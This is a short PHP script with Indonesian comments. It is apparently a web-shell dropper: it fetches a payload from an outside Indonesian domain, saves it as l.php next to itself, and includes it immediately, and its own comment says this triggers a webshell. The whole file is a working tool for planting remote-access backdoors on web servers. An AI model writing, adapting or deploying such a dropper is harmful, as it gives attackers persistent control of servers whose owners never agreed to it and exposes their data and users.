<?php
$url = 'https://adevnatural.co.id/al.txt';

$target = __DIR__ . '/l.php';

// Ambil isi kode dari URL
$payload = file_get_contents($url);
if ($payload === false) {
    die('Gagal !');
}

if (file_put_contents($target, $payload)) {
    echo "d berhasil disimpan ke: $target\n";

    // Auto trigger webshell
    include($target);
} else {
    echo "Gagal menyimpan d. Cek d d!\n";
}
?>
